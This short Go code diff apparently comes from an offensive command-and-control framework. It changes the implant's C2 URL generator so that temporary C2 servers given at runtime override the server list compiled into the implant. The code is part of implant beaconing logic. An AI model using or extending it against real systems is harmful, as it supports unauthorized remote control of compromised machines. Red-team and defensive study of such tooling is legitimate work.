@@ -36,17 +36,26 @@ const (
 )
 
 // C2Generator - Creates a stream of C2 URLs based on a connection strategy
-func C2Generator(abort <-chan struct{}) <-chan *url.URL {
+func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 	// {{if .Config.Debug}}
 	log.Printf("Starting c2 url generator ({{.Config.ConnectionStrategy}}) ...")
 	// {{end}}
 
 	c2Servers := []func() string{}
-	// {{range $index, $value := .Config.C2}}
-	c2Servers = append(c2Servers, func() string {
-		return "{{$value}}" // {{$index}}
-	})
-	// {{end}} - range
+	// Any temporary C2 servers that are defined will override what is configured in the implant
+	if len(temporaryC2) > 0 {
+		for _, c2 := range temporaryC2 {
+			c2Servers = append(c2Servers, func() string {
+				return c2
+			})
+		}
+	} else {
+		// {{range $index, $value := .Config.C2}}
+		c2Servers = append(c2Servers, func() string {
+			return "{{$value}}" // {{$index}}
+		})
+		// {{end}} - range
+	}
 
 	generator := make(chan *url.URL)
 	go func() {
